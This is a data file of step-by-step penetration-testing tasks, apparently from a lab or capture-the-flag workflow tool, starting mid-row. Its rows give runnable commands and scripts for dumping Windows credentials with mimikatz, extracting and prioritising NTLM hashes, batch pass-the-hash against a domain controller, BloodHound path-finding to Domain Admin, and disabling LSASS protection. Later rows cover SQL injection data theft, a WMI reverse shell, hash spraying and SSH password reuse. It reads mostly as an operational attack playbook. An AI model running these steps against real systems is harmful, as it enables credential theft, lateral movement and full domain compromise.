         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
         * SHA1     : 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0
        tspkg :
        wdigest :
         * Username : administrator
         * Domain   : CORP
         * Password : (null)  [OR plaintext password if WDigest enabled]
        kerberos :
         * Username : administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :

[... repeats for each cached credential ...]
```

Key Fields to Extract:

1. Session Type:
   - ""Service from 0"": GOLDMINE - persists until reboot, check these FIRST
   - ""Interactive from 2"": Current user logged in (may log out soon)
   - ""RemoteInteractive from 10"": RDP session (similar to interactive)

2. Username/Domain:
   - Format: DOMAIN\\username
   - Look for: administrator, domain admin accounts, svc_* service accounts

3. NTLM Hash:
   - 32 hexadecimal characters (0-9, a-f)
   - This is what you need for Pass-the-Hash
   - Located under ""msv :"" section

4. Plaintext Password:
   - Under ""wdigest :"" section
   - Usually ""(null)"" on Windows 8.1+ (WDigest disabled by default)
   - If present: GOLDMINE - use directly, no PTH needed

5. Logon Server:
   - Shows Domain Controller name
   - Confirms domain account (not local)

Output Size:
- Typical workstation: 50-200 lines
- Server: 200-500 lines
- Domain Controller: 500-2000+ lines

Troubleshooting:

1. ERROR 0x00000005 Access Denied:
   - Cause: Forgot privilege::debug (step 2)
   - Solution: Run command again with privilege::debug included

2. Empty Output / No Credentials:
   - Cause: System recently rebooted, no logins yet
   - Solution: Wait for user logins, target different system

3. Only Computer Accounts (HOSTNAME$):
   - Cause: No user sessions cached
   - Solution: Target different system, check servers

4. Empty NTLM/Password Fields:
   - Cause: WDigest disabled (Windows 8.1+ default)
   - Solution: Extract Kerberos tickets instead (sekurlsa::tickets)

5. LSASS Protected (ERROR):
   - Cause: Credential Guard enabled, LSA protection
   - Solution: Disable protection (reg delete), use alternative method

6. Output Too Long for Terminal:
   - Cause: Forgot to redirect to file
   - Solution: Re-run with ""> credentials.txt""

Alternative Commands:

1. Export to different format:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords /format:list"" ""exit"" > creds_list.txt
   ```

2. Dump specific authentication package:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::msv"" ""exit""  # NTLM only
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::wdigest"" ""exit""  # Plaintext only
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::kerberos"" ""exit""  # Kerberos only
   ```

3. Export tickets:
   ```
   .\\mimikatz.exe ""privilege::debug"" ""sekurlsa::tickets /export"" ""exit""
   ```","",""
"parse-extract-credentials","Parse Output and Extract High-Value Credentials","Parse mimikatz output to extract NTLM hashes and identify Domain Admin credentials","Parse the credentials.txt file to extract NTLM hashes, map to usernames, and identify high-value targets (Domain Admins, service accounts).

Parsing Process:

1. Open credentials.txt:
   ```
   type C:\\temp\\credentials.txt | more
   ```
   OR download for local parsing:
   ```
   download C:\\temp\\credentials.txt  # From Evil-WinRM
   ```

2. Search for Key Patterns:
   - ""Session           : Service from 0"" (PRIORITY - persistent sessions)
   - ""* NTLM     :"" (followed by 32 hex characters)
   - ""* Username :"" (extract username)
   - ""* Domain   :"" (extract domain)

3. Extract Credentials:
   For each session, capture:
   - Session Type
   - Username
   - Domain
   - NTLM Hash (32 hex chars)
   - Logon Server (confirms DC)

Manual Extraction Example:
Input (credentials.txt):
```
Authentication Id : 0 ; 123456
Session           : Service from 0
User Name         : administrator
Domain            : CORP
Logon Server      : DC01
        msv :
         * Username : administrator
         * Domain   : CORP
         * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

Extracted Credential:
```
CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Session: Service from 0 (persistent)
Logon Server: DC01
```

Automated Parsing (PowerShell):
```powershell
$content = Get-Content C:\\temp\\credentials.txt
$credentials = @()

for ($i = 0; $i -lt $content.Length; $i++) {
    if ($content[$i] -match 'User Name\\s+:\\s+(.+)') {
        $username = $Matches[1].Trim()
    }
    if ($content[$i] -match 'Domain\\s+:\\s+(.+)') {
        $domain = $Matches[1].Trim()
    }
    if ($content[$i] -match '\\* NTLM\\s+:\\s+([a-f0-9]{32})') {
        $ntlm = $Matches[1]
        $credentials += ""$domain\\$username:$ntlm""
    }
}

$credentials | Out-File C:\\temp\\extracted_creds.txt
```

Automated Parsing (Linux - grep):
```bash
grep -A 10 ""Session"" credentials.txt | grep -E ""Session|Username|Domain|NTLM"" > parsed.txt
```

Prioritization Strategy:

1. Identify Domain Admins:
   ```
   net group ""Domain Admins"" /domain
   ```
   Cross-reference extracted usernames with this list.

2. Priority Order:
   - Administrator (built-in DA, RID 500)
   - Domain Admin group members
   - Enterprise Admins
   - Service accounts (svc_*, sql_*, backup_*)
   - IT/helpdesk accounts (it_admin, helpdesk, etc.)
   - Standard users (lowest priority)

3. Session Type Priority:
   - Service from 0 (HIGHEST - persists until reboot)
   - Interactive from 2 (Medium - current user, may log out)
   - RemoteInteractive from 10 (Medium - RDP session)
   - Network sessions (Lowest - temporary)

Hash Format Validation:
- NTLM hash: EXACTLY 32 hexadecimal characters (0-9, a-f)
- Valid example: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
- Invalid formats:
  - 40 chars = SHA1 (can't use for PTH)
  - 16 chars = partial hash (corrupted)
  - Contains spaces/special chars = parsing error

Expected Findings:
- Typical workstation: 5-15 credentials
- At least 1-2 Domain Admin accounts (if workstation active)
- Computer accounts (HOSTNAME$) - ignore these
- Local accounts (domain = hostname) - ignore, focus on DOMAIN\\user

Create Credential List:
```
HIGH PRIORITY (Domain Admins):
CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
CORP\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1

MEDIUM PRIORITY (Service Accounts):
CORP\\svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
CORP\\sql_service:d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3

LOW PRIORITY (Standard Users):
CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Troubleshooting:
- No NTLM hashes: Check if WDigest disabled, extract Kerberos tickets instead
- Hash extraction fails: Verify format (32 hex chars), check for whitespace
- Can't determine DA membership: Run 'net group ""Domain Admins"" /domain' from target
- Duplicate entries: Same user may appear multiple times (different sessions), use most recent","",""
"validate-credentials","Validate Credentials with Pass-the-Hash","Test extracted NTLM hashes to confirm they work and identify Domain Admin access","Use crackmapexec to validate extracted NTLM hashes work for domain authentication and confirm which accounts have Domain Admin privileges.

Validation Command:
```
crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>
```

Example:
```
crackmapexec smb 10.10.10.10 -u administrator -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP
```

Expected Output (Domain Admin):
```
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:CORP) (signing:True)
SMB  10.10.10.10  445  DC01  [+] CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)
```

Key Indicators:
- [+] = Authentication successful
- (Pwn3d!) = Domain Admin privileges (can write to C$ on DC)
- [name:DC01] = Domain Controller identification

Expected Output (Valid User, Not DA):
```
SMB  10.10.10.10  445  DC01  [+] CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Note: No ""Pwn3d!"" = Valid credentials but NOT Domain Admin. Can still use for lateral movement.

Expected Output (Failed):
```
SMB  10.10.10.10  445  DC01  [-] CORP\\baduser:badhash STATUS_LOGON_FAILURE
```

Batch Validation (Multiple Credentials):

Create credential file (creds.txt):
```
administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1
svc_backup:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2
john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4
```

Batch test script:
```bash
#!/bin/bash
DC=""10.10.10.10""
DOMAIN=""CORP""

while IFS=':' read -r user hash; do
    echo ""[*] Testing $user...""
    crackmapexec smb $DC -u $user -H $hash -d $DOMAIN
    echo """"
done < creds.txt
```

Validation Results Documentation:
```
DOMAIN ADMINS (Pwn3d!):
- CORP\\administrator:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 ✓
- CORP\\svc_admin:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1 ✓

VALID USERS (No Pwn3d):
- CORP\\john:e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3d4 ✓

FAILED:
- CORP\\disabled_account:... ✗ (STATUS_LOGON_FAILURE)
```

Find Domain Controller:
If DC IP unknown:
1. From compromised system:
   ```
   nltest /dclist:CORP
   ```
2. DNS query:
   ```
   nslookup -type=SRV _ldap._tcp.dc._msdcs.CORP.LOCAL
   ```
3. Port scan:
   ```
   nmap -p 88,389,636,445 10.10.10.0/24
   ```
   Look for systems with Kerberos (88), LDAP (389), SMB (445)

Alternative Validation Methods:

1. Evil-WinRM PTH:
   ```
   evil-winrm -i <DC_IP> -u administrator -H <hash>
   ```
   If connects: Valid credentials
   If DA: Can access C:\\Users\\Administrator

2. Impacket PSExec:
   ```
   impacket-psexec -hashes :<hash> CORP/administrator@<DC_IP>
   ```
   If gets shell: Valid DA credentials

3. SMB Enumeration:
   ```
   smbclient //DC01/C$ -U administrator --pw-nt-hash <hash>
   ```
   If lists files: Valid DA credentials

Troubleshooting:
- Connection timeout: Check network routing, firewall, DC online
- STATUS_LOGON_FAILURE: Hash incorrect, account disabled, or wrong domain
- [+] but no Pwn3d: Valid user but NOT Domain Admin, can use for lateral movement
- Account lockout: Test 1 credential at a time, wait between attempts
- Clock skew: Sync time with DC (ntpdate <DC_IP>)

Next Steps After Validation:
1. Domain Admin found: Proceed to DC access and flag retrieval
2. Valid users only: Use for lateral movement to more systems
3. All failed: Re-dump credentials, check for stale hashes","",""
"detect-sqli","Detect SQL Injection Vulnerability","Confirm SQL injection exists and identify database type","Test for SQL injection by injecting single quote in POST parameters.
Look for PostgreSQL-specific error messages indicating vulnerable parameter.","",""
"enum-columns","Enumerate Column Count","Determine number of columns in SQL query for UNION attack","Use ORDER BY technique to count columns.
Increment ORDER BY value until error occurs, revealing column count.","",""
"test-union","Test UNION SELECT Injection","Confirm UNION injection works and identify displayed columns","Test UNION SELECT with NULL values matching column count.
Use test strings to identify which column positions display on page.","",""
"extract-db-info","Extract PostgreSQL Database Information","Enumerate database version, name, user, and superuser status","Use UNION SELECT to extract: version(), current_database(), current_user, usesuper status.
Verify if database user has superuser privileges (required for file functions).","",""
"extract-credentials","Extract Database Credentials from Config File","Read database configuration file to obtain plaintext password","Use pg_read_file() via UNION SELECT to read common config file locations: /var/www/html/dbcon.php, /var/www/html/config.php, /etc/webapp/database.conf.
Extract username and password from file contents.","",""
"connect-postgres","Establish Direct PostgreSQL Connection","Connect to PostgreSQL database using extracted credentials","Use psql client to connect directly to PostgreSQL server on port 5432.
Bypass web application layer entirely.
Verify connection success and superuser privileges.","",""
"verify-privileges","Verify Superuser Privileges","Confirm superuser status and available file functions","Verify usesuper is TRUE and test pg_ls_dir() and pg_read_file() functions are available.
Confirm postgres user file access permissions.","",""
"enum-filesystem","Enumerate Filesystem for Sensitive Files","Systematically search filesystem for flags, credentials, or sensitive data","Use pg_ls_dir() to list directories.
Check common locations: /, /home, /tmp, /var, /var/www, /opt, /root (if accessible).
Look for flag.txt, credentials, .ssh keys, or other sensitive files.","",""
"retrieve-file","Retrieve Sensitive File Contents","Read target file using pg_read_file() and extract contents","Use pg_read_file('/path/to/file') to read file contents.
For large files, may need to read in chunks using offset/length parameters.","",""
"mark-owned-users","Mark All Compromised Users as Owned","Mark all compromised domain users as 'owned' in BloodHound to enable owned-principal queries","Mark every compromised user account as owned in BloodHound GUI. This is CRITICAL because pre-built queries filter for paths FROM owned principals.

Process:
1. Open BloodHound GUI
2. Use search bar to find first compromised user (type username)
3. Right-click user node → 'Mark User as Owned'
4. Verify: User icon shows red skull icon
5. Repeat for ALL compromised users (pete, mike, dave, etc.)

Why This Matters:
- Pre-built query 'Shortest Paths to Domain Admins from Owned Principals' ONLY shows paths from marked users
- If you forget to mark a user as owned, their paths won't appear in queries
- Marking multiple users increases chances of finding attack path

Expected State:
- All compromised users show red skull icon in BloodHound
- Node info panel shows 'Owned: Yes'
- Pre-built queries now include these users in results

Troubleshooting:
- Can't find user: Check username format (should be 'user@domain.com' lowercase)
- Multiple users with same name: Check SID or full distinguished name
- Mark doesn't persist: BloodHound database may not be writable (check Neo4j permissions)
- User not in database: Re-run BloodHound collection, ensure user exists in domain

CLI Alternative (if GUI unavailable):
Using cypher-shell:
```
MATCH (u:User {name:'PETE@CORP.LOCAL'}) SET u.owned=true RETURN u.name
```

Batch marking (if many users):
```
MATCH (u:User) WHERE u.name IN ['PETE@CORP.LOCAL', 'MIKE@CORP.LOCAL', 'DAVE@CORP.LOCAL'] SET u.owned=true RETURN u.name
```

Verification:
Run query to list all owned users:
```
MATCH (u:User {owned:true}) RETURN u.name
```

Common Mistake:
Marking only FIRST compromised user. The writeup shows: pete had NO paths, but mike (also compromised) had AdminTo on CLIENT75. Test ALL users.","",""
"run-prebuilt-queries","Run Pre-Built Queries and Document Results","Execute BloodHound pre-built queries to establish baseline before moving to custom queries","Run BloodHound's pre-built queries to check for obvious attack paths. When these fail (return 'No paths found'), this validates the need for custom Cypher queries.

Pre-Built Queries to Run:

1. 'Shortest Paths to Domain Admins from Owned Principals'
   - Analysis tab → Pre-Built Queries → Pathfinding
   - Click query name to execute
   - Expected result: Graph showing paths OR 'No paths found'

2. 'Shortest Paths to High Value Targets from Owned Principals'
   - Broader than Domain Admins (includes Enterprise Admins, other groups)
   - May find paths even if DA query fails

3. 'Find Computers where Domain Users are Local Admin'
   - Shows systems with over-privileged access
   - Filter results for owned users

4. 'List all Owned Principals'
   - Verification query: confirms all users marked correctly
   - Should show pete, mike, dave, etc.

Documenting Results:
- 'No paths found': Proceed to custom Cypher queries (expected scenario)
- Paths found: Document path, validate it's exploitable, execute attack
- Partial results: Some users have paths, others don't (iterate with custom queries)

CRITICAL UNDERSTANDING:
'No paths found' from pre-built queries does NOT mean:
- No attack path exists
- You should give up on BloodHound
- Lateral movement is impossible

It DOES mean:
- No DIRECT path from owned users to Domain Admins
- Need to find INDIRECT paths via intermediate systems/users
- Time to use custom Cypher queries

Query Execution Tips:
- Wait 5-10 seconds for large domains (thousands of users)
- If query hangs, check Neo4j CPU usage (may need optimization)
- Graph view can be zoomed (scroll wheel) and panned (drag)
- Node info: Click any node to see properties, relationships, permissions

Expected Timeline:
- Small domain (<100 users): Queries run in 1-2 seconds
- Medium domain (100-1000 users): 5-10 seconds per query
- Large domain (>1000 users): May need query optimization or timeout adjustment

Troubleshooting:
- All queries return empty: Check if users actually marked as owned (step 1)
- Query timeout: Increase Neo4j timeout in BloodHound settings
- Can't find Analysis tab: Check BloodHound version (v4+ has different UI)
- Graph too complex: Use filters to hide low-value nodes","",""
"enumerate-adminto","Enumerate AdminTo Relationships for Each User","Use custom Cypher to find all systems where compromised users have local admin privileges","Run custom Cypher query to enumerate AdminTo relationships for each compromised user. This identifies lateral movement opportunities.

Custom Cypher Query:
```
MATCH (u:User {name:'PETE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name
```

Execution Process:
1. Open BloodHound GUI
2. Click 'Raw Query' field at top (or query icon)
3. Paste query with first compromised user
4. Replace 'PETE@CORP.LOCAL' with actual username (UPPERCASE, with @DOMAIN)
5. Press Enter or click Execute
6. Review results in graph view and table view
7. Repeat for ALL compromised users

Expected Results:
- List of systems where user has local admin
- Graph showing user → AdminTo → computer relationships
- System hostnames with domain suffix (CLIENT75.CORP.LOCAL)

Example Output:
```
u.name              | c.name
--------------------|----------------------
PETE@CORP.LOCAL     | (no results)
MIKE@CORP.LOCAL     | CLIENT75.CORP.LOCAL
DAVE@CORP.LOCAL     | WORKSTATION10.CORP.LOCAL
```

Interpretation:
- Pete: No AdminTo relationships (dead end for this user)
- Mike: AdminTo on CLIENT75 (LATERAL MOVEMENT OPPORTUNITY)
- Dave: AdminTo on WORKSTATION10 (LATERAL MOVEMENT OPPORTUNITY)

Next Steps After Finding AdminTo:
1. Document all AdminTo relationships
2. Prioritize: Servers > Workstations (more likely to have valuable sessions)
3. Check for HasSession relationships on these systems (step 4)
4. Plan lateral movement using evil-winrm, PSExec, or WMI

Advanced Query (All Users at Once):
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name
```

This shows AdminTo for ALL owned users in one query. Faster but may be overwhelming with many results.

Query Variants:

Count AdminTo relationships:
```
MATCH (u:User {name:'MIKE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)
RETURN u.name, count(c) as admin_count
```

Filter for specific computer types:
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
WHERE c.operatingsystem CONTAINS 'Server'
RETURN u.name, c.name, c.operatingsystem
```

Troubleshooting:
- No results for any user: Check username format (must be 'USER@DOMAIN.COM')
- 'Invalid property' error: User not in database, check collection
- Too many results: Filter by OS, last logon, or other properties
- Can't copy query: Type manually, ensure quotes are correct (single quotes for strings)

CRITICAL: Don't stop after first user with no AdminTo. Iterate through ALL users. The writeup shows pete had nothing, but mike had CLIENT75.","",""
"check-sessions","Check for High-Value Sessions on Accessible Systems","Query for Domain Admin sessions on systems where compromised users have AdminTo access","Use custom Cypher to check if systems (where you have AdminTo) have Domain Admin sessions cached. This identifies credential harvesting opportunities.

Custom Cypher Query:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
RETURN c.name, u.name, u.enabled
```

Execution Process:
1. Take list of systems from step 3 (where you have AdminTo)
2. For EACH system, run query to check sessions
3. Replace 'CLIENT75.CORP.LOCAL' with actual system name
4. Look for Domain Admin accounts in results
5. Verify user is enabled (u.enabled = true)

Expected Results:
```
c.name                   | u.name                    | u.enabled
-------------------------|---------------------------|----------
CLIENT75.CORP.LOCAL      | ADMINISTRATOR@CORP.LOCAL  | true
CLIENT75.CORP.LOCAL      | WORKSTATION_USER@CORP.LOCAL | true
```

Interpretation:
- ADMINISTRATOR session on CLIENT75: JACKPOT! This is Domain Admin
- WORKSTATION_USER session: Standard user, less valuable
- Focus on: Administrator, svc_admin, any account with 'admin' in name

Verify Domain Admin Membership:
Custom query to check if user is Domain Admin:
```
MATCH (u:User {name:'ADMINISTRATOR@CORP.LOCAL'})-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u.name, g.name
```

If query returns results: User IS Domain Admin
If query returns empty: User is not Domain Admin, check other groups

Advanced Query (All Sessions on Accessible Systems):
```
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
MATCH (c)<-[:HasSession]-(u2:User)
WHERE u2.enabled = true
RETURN u.name as owned_user, c.name as system, u2.name as session_user
```

This finds ALL sessions on ALL systems where owned users have AdminTo. Faster for multiple systems.

Prioritization:
1. Domain Admins: Highest priority (instant domain compromise)
2. Enterprise Admins: Even higher privileges (multi-domain access)
3. Service accounts: Often reused passwords, lateral movement
4. IT/helpdesk accounts: Over-privileged, may have access to sensitive systems

Query Variants:

Filter for admin-like names:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
WHERE u.name CONTAINS 'ADMIN' OR u.name CONTAINS 'SVC'
RETURN c.name, u.name
```

Check session count:
```
MATCH (c:Computer {name:'CLIENT75.CORP.LOCAL'})<-[:HasSession]-(u:User)
RETURN c.name, count(u) as session_count
```

Troubleshooting:
- No sessions found: System may be offline, check last logon time
- Only computer accounts: No user sessions cached, target different system
- Can't verify DA membership: Check group name format ('DOMAIN ADMINS@DOMAIN.COM')
- Too many sessions: Filter for enabled=true and admin-like names

CRITICAL SUCCESS: Found CLIENT75 has ADMINISTRATOR session + mike has AdminTo on CLIENT75 = Attack Path!
Next: Lateral movement to CLIENT75 → credential harvest → domain compromise","",""
"validate-attack-path","Validate and Document Attack Path","Verify the discovered attack path is exploitable and document complete chain","Validate that the discovered attack path is actually exploitable before executing the attack. This prevents wasting time on broken paths.

Attack Path Format:
Compromised User → AdminTo → System → HasSession → Domain Admin

Example from Corp-DCSync Writeup:
MIKE@CORP.LOCAL → AdminTo → CLIENT75 → HasSession → ADMINISTRATOR@CORP.LOCAL

Validation Checklist:

1. Compromised User Access:
   - Confirm you have credentials for mike (password or hash)
   - Test authentication: crackmapexec smb <any_system> -u mike -p <password>
   - Verify mike is marked as owned in BloodHound

2. AdminTo Relationship:
   - Confirm mike has local admin on CLIENT75
   - Test access: crackmapexec smb CLIENT75 -u mike -p <password>
   - Look for 'Pwn3d!' indicator (confirms local admin)

3. System Accessibility:
   - Confirm CLIENT75 is online: ping CLIENT75.CORP.LOCAL
   - Check WinRM port: nmap -p 5985,5986 CLIENT75.CORP.LOCAL
   - Check SMB port: nmap -p 445 CLIENT75.CORP.LOCAL

4. Session Validity:
   - BloodHound data may be stale (hours/days old)
   - Administrator session MIGHT have logged out
   - Service sessions more reliable (persist until reboot)
   - Validation: Execute attack, check mimikatz output for session

5. Domain Admin Verification:
   - Confirm ADMINISTRATOR is actually Domain Admin
   - Command: net group ""Domain Admins"" /domain (from any domain system)
   - Look for Administrator in member list

Documenting Attack Path:

Text Format:
```
Attack Path Discovered:
- Owned User: mike@corp.local (credentials: mike:Password123!)
- AdminTo: CLIENT75.CORP.LOCAL (validated with crackmapexec Pwn3d!)
- HasSession: administrator@corp.local (Domain Admin confirmed)
- Attack Vector: Lateral movement to CLIENT75 → mimikatz credential dump → extract DA hash → domain compromise
- Estimated Time: 15 minutes
- Prerequisites: None (mike credentials sufficient)
```

Visual Format (Graph Export):
1. In BloodHound, run custom query to show full path:
```
MATCH p=(u:User {name:'MIKE@CORP.LOCAL'})-[:AdminTo]->(c:Computer)<-[:HasSession]-(admin:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN p
```
2. Export graph: Right-click → Export Graph → PNG
3. Save for documentation

Alternative Paths:
If primary path fails validation:
- Check OTHER compromised users (dave, pete) for different paths
- Check OTHER systems where mike has AdminTo
- Look for group membership paths (MemberOf relationships)
- Consider Kerberoasting or AS-REP roasting as alternatives

Common Validation Failures:
- System offline: Target different system from AdminTo list
- Session stale: Proceed anyway, check mimikatz output for current sessions
- No WinRM: Use PSExec or WMI for lateral movement
- Account disabled: Verify with 'net user <username> /domain'

Success Criteria:
- All 5 validation checks pass
- Attack path documented completely
- Ready to execute: lateral movement → credential harvest → escalation","",""
"detect-sqli","Detect SQL Injection Vulnerability","Confirm parameter is vulnerable to SQL injection using error-based technique","Test parameter with single quote payload. Look for database error messages revealing backend type (MySQL, PostgreSQL, MSSQL).","",""
"enum-columns","Enumerate Column Count","Determine number of columns in SQL query using ORDER BY technique","Increment ORDER BY value (ORDER BY 1, ORDER BY 2, ...) until error occurs. Last successful value equals column count. CRITICAL: UNION SELECT requires exact column count match.","",""
"test-union","Test UNION SELECT Injection","Verify UNION injection works and identify which columns are displayed on page","Use UNION SELECT with NULL values matching column count. Replace NULLs with test strings ('test1', 'test2') to identify displayed column positions.","",""
"identify-database","Identify Database Type and Version","Extract database type, version, current database name, and user","Use database-specific functions in displayed columns: MySQL (version(), database(), user()), PostgreSQL (version(), current_database(), current_user), MSSQL (@@version, DB_NAME(), USER_NAME()). This step determines which branch to follow.","",""
"enum-mysql-tables","Enumerate MySQL Tables","Extract table names from MySQL information_schema","Query information_schema.tables to get all table names in current database. Filter out system databases (mysql, information_schema). Focus on tables containing 'user', 'admin', 'credential' keywords.","",""
"enum-postgres-tables","Enumerate PostgreSQL Tables","Extract table names from PostgreSQL pg_catalog or information_schema","Query information_schema.tables or pg_catalog.pg_tables for table names in public schema. Use PostgreSQL concatenation operator (||) instead of CONCAT.","",""
"enum-mssql-tables","Enumerate MSSQL Tables","Extract table names from MSSQL system views","Query sys.tables or information_schema.tables for table names in current database. Use MSSQL + concatenation operator instead of ||.","",""
"extract-mysql-data","Extract MySQL Credentials","Dump username and password columns from identified tables","Use UNION SELECT to extract data from users/admin tables. Use CONCAT or GROUP_CONCAT to combine multiple rows. Target username and password columns.","",""
"extract-postgres-data","Extract PostgreSQL Credentials","Dump credentials from PostgreSQL tables","Extract username and password columns using PostgreSQL concatenation (||) operator. Use ::text casting if needed for type compatibility.","",""
"extract-mssql-data","Extract MSSQL Credentials","Dump credentials from MSSQL tables","Extract data using MSSQL + concatenation operator and CAST for type conversion. Target username and password columns in identified tables.","",""
"verify-admin-access","Verify Admin Access with CrackMapExec","Confirm credentials grant local administrator access before attempting lateral movement","Use CrackMapExec to test SMB authentication and verify admin rights (Pwn3d! indicator).

This prevents wasting time on failed exploitation attempts.","",""
"check-wmi-port","Verify WMI/RPC Port Accessibility","Ensure RPC port 135 is accessible for WMI communication","WMI requires RPC port 135 + dynamic high ports (49152-65535).

Quick nmap check saves time before attempting full exploitation.","",""
"generate-payload","Generate Base64 PowerShell Reverse Shell","Create encoded PowerShell payload for reverse shell callback to Kali","Generate base64-encoded PowerShell reverse shell using helper script.

Encoding avoids command-line escaping issues and provides basic evasion.","",""
"setup-listener","Start Netcat Listener","Set up listener on Kali to catch reverse shell connection","Start Netcat listener on specified port (commonly 443 or 4444) before executing payload to catch incoming shell.

Listener must be active before payload execution.","",""
"execute-wmi","Execute WMI Lateral Movement","Use impacket-wmiexec to execute encoded payload on target via WMI","Execute base64-encoded PowerShell reverse shell on target using WMI.

Impacket-wmiexec provides semi-interactive shell or can run single commands.","",""
"verify-shell","Verify Reverse Shell Access","Confirm reverse shell connection and identify compromised system context","Run whoami and hostname commands to verify shell access and confirm target system.

Check user context (should be authenticated user, not SYSTEM).","",""
"post-exploit-enum","Post-Exploitation Enumeration","Enumerate target system for privilege escalation opportunities and sensitive data","Begin basic enumeration:
- Check privileges (whoami /priv)
- Group membership (whoami /groups)
- Running processes
- Installed software
- Network connections","",""
"verify-hash","Verify NTLM Hash Obtained","Confirm NTLM hash is available and properly formatted","Ensure hash is 32 hexadecimal characters with known username and domain.
Verify hash was extracted from mimikatz sekurlsa::logonpasswords or secretsdump output.","",""
"launch-mimikatz","Launch Mimikatz with Debug Privileges","Start mimikatz and enable SeDebugPrivilege for LSASS access","Run mimikatz as Administrator and execute privilege::debug.
This enables access to LSASS process where credentials are injected.","",""
"inject-hash","Inject NTLM Hash with sekurlsa::pth","Create new PowerShell process with NTLM hash injected into LSASS","Execute sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.
This spawns PowerShell with injected credentials.","",""
"trigger-kerberos","Trigger Kerberos TGT Request","Force Kerberos authentication to generate TGT using injected hash","From new PowerShell window, run 'net use \\<TARGET>' using HOSTNAME (not IP).
This triggers Kerberos pre-authentication using injected hash, generating TGT.","",""
"verify-tickets","Verify Kerberos Tickets Created","Confirm TGT and TGS tickets were generated using klist command","Run klist in PowerShell to display cached Kerberos tickets.
Should see TGT (Server: krbtgt/<DOMAIN>) and TGS (Server: cifs/<TARGET>).","",""
"use-microsoft-psexec","Execute Microsoft PsExec with Kerberos","Use official Microsoft PsExec64.exe with Kerberos tickets for lateral movement","From PowerShell with injected credentials, run PsExec64.exe \\<TARGET> cmd.
PsExec will use cached Kerberos tickets for authentication (no password needed).","",""
"verify-lateral-movement","Verify Lateral Movement Success","Confirm shell is on target system with correct user context","Run whoami and hostname to verify.
Context should be domain user (from hash), not SYSTEM.","",""
"verify-smb-access","Verify SMB and ADMIN$ Access","Confirm SMB port 445 open and ADMIN$ share accessible with current credentials","Use CrackMapExec to test SMB authentication and share enumeration.
Look for Pwn3d! indicator confirming admin access and ADMIN$ in share list.","",""
"verify-firewall","Verify File and Printer Sharing Enabled","Ensure firewall allows File and Printer Sharing (required for PSExec)","Check ports 445 (SMB) and 135 (RPC for service creation) are open.
These are required for PSExec to upload binary and create service.","",""
"execute-psexec","Execute Impacket PSExec","Use impacket-psexec to gain remote SYSTEM shell on target","Run impacket-psexec with domain/user:password@target format.
PSExec will upload RemCom.exe, create service, and spawn cmd.exe as SYSTEM.","",""
"verify-system","Verify SYSTEM Access","Confirm shell is running as NT AUTHORITY\SYSTEM with full privileges","Run whoami to verify SYSTEM context.
PSExec spawns shells as SYSTEM by default, providing highest privilege level.","",""
"dump-credentials","Dump Credentials","Extract password hashes and credentials from target system","Use SYSTEM access to dump SAM, SYSTEM, SECURITY registry hives or run mimikatz/secretsdump for credential extraction.
Extract password hashes for further lateral movement.","",""
"lateral-movement-spray","Spray Hashes Across Network","Test extracted hashes against other targets for further lateral movement","Use CrackMapExec to spray obtained hashes across subnet.
Local admin password reuse is common - same hash often works on multiple systems.","",""
"discover-db-creds","Discover Database Credentials","Extract database credentials from web configuration files","Search /var/www/html and other web directories for password strings in PHP config files, .env files, and configuration scripts.
Look for database connection strings with usernames and passwords.","",""
"enum-system-users","Enumerate System Users","Extract valid usernames from /etc/passwd with login shells","Filter /etc/passwd for users with real shells (not nologin or /bin/false).
These are potential SSH targets for credential reuse testing.","",""
"test-ssh-creds","Test Credentials on SSH","Attempt SSH login with discovered database credentials","Use sshpass to automate SSH authentication testing.
Try discovered database password against all enumerated usernames.
Credential reuse is common - database passwords often work for SSH.","",""
"access-mysql","Access MySQL Database","Connect to MySQL/MariaDB with discovered credentials","Use mysql client to connect with found credentials.
Enumerate databases and tables.
Look for users, admin, credentials tables with password hashes or plaintext passwords.","",""
